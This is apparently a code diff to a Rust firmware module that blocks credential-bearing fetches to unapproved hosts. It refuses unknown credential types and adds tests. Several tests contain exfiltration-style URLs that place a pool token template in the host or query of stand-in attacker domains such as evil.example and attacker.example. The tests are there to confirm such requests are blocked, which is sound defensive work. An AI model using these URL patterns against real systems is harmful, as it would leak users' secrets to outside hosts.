@@ -340,11 +340,14 @@ fn egress_permitted(state: &HostState, url: &url::Url, spent: &[String]) -> bool
             // Letting it report names the slot instead of blaming the host.
             return true;
         };
-        let policy = bmc_widget_manifest::credential::builtins()
-            .into_iter()
-            .find(|t| t.id == type_id)
-            .and_then(|t| t.egress);
-        let permitted = policy.is_none_or(|p| p.allows(&host, port));
+        let Some(builtin) = bmc_widget_manifest::credential::BuiltinType::from_id(type_id) else {
+            // A type this firmware does not know has an unknowable policy,
+            // and unknowable is not the same as absent.
+            // `secrets.json` is hand-editable, which is all it takes to get here.
+            tracing::warn!(slot, type_id, "refusing fetch: unknown credential type");
+            return false;
+        };
+        let permitted = builtin.egress().is_none_or(|p| p.allows(&host, port));
         if !permitted {
             tracing::warn!(
                 slot,
@@ -535,6 +538,43 @@ mod tests {
     }
 
     #[test]
+    fn a_placeholder_in_the_host_cannot_smuggle_a_pinned_secret_out() {
+        // Either the placeholder leaves the URL unparsable,
+        // or the host it spells fails the pin — both refuse.
+        // Substituting first would instead hand the token
+        // to whoever resolves what it turns into.
+        let state = host_state_with("braiins-pool");
+
+        for url in [
+            "https://{{ credential.pool.token }}/x",
+            "https://{{credential.pool.token}}.evil.example/x",
+        ] {
+            assert!(
+                spend(&state, url, &[], None).is_none(),
+                "a pinned secret escaped through the host position: {url}"
+            );
+        }
+    }
+
+    #[test]
+    fn a_secret_of_an_unknown_type_is_never_spent() {
+        // Renaming an account's type in the hand-editable store reaches this,
+        // and it must not read as "this type has no pin".
+        let state = host_state_with("braiins-pool-but-renamed");
+
+        assert!(
+            spend(
+                &state,
+                "https://attacker.example/?t={{ credential.pool.token }}",
+                &[],
+                None,
+            )
+            .is_none(),
+            "an unknowable policy is not an absent one"
+        );
+    }
+
+    #[test]
     fn a_secret_whose_slot_has_no_type_is_never_spent() {
         // Only a momentary disagreement between the two halves gets here,
         // and that is exactly when the pin must not be skipped.
@@ -614,6 +654,18 @@ mod tests {
         assert_eq!(
             parsed_authority("http://[fd00::1]:4028/api"),
             Some(("fd00::1".to_owned(), Some(4028)))
+        );
+    }
+
+    #[test]
+    fn a_url_still_carrying_a_placeholder_parses_to_its_real_host() {
+        // The pin runs before substitution, so it sees braces and spaces
+        // in the query. Were those to fail the parse,
+        // every pin test would pass by refusing unparsable input
+        // rather than by pinning.
+        assert_eq!(
+            parsed_authority("https://attacker.test/?t={{ credential.pool.token }}"),
+            Some(("attacker.test".to_owned(), None))
         );
     }
 
